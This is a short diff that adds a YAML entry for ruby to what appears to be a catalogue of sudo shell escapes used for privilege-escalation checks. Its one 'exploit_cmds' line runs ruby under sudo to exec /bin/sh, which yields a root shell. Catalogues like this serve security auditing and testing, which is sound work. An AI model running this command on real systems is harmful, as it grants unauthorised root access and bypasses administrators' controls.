@@ -1,0 +1,4 @@
+name: ruby
+binary_path: /usr/bin/ruby
+exploit_cmds:
+- sudo /usr/bin/ruby -e 'exec "/bin/sh"'
